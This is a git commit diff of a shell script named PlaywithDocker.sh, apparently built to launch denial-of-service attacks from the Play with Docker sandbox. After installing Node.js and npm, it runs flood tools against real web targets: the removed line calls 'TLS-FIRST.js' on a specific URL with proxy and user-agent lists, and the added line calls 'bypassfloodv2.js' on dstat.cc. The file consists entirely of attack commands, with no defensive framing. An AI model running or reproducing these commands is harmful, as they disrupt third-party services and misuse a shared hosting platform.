34597351db4fbe570b87525d46695b4eb85dc8ec
GolubevsEv <124365636+GolubevsEv@users.noreply.github.com>
2023-06-09 20:03:37 +0300

    Update PlaywithDocker.sh

--- PlaywithDocker.sh
+++ PlaywithDocker.sh
@@ -6,5 +6,4 @@ bash install.sh -y
 apk add nodejs
 apk add npm
 npm i colors
-node TLS-FIRST.js https://fedex.sinfo4.date/223407646 3000 proxy.txt ua.txt 13 100
-
+node bypassfloodv2.js https://dstat.cc/ 100 100
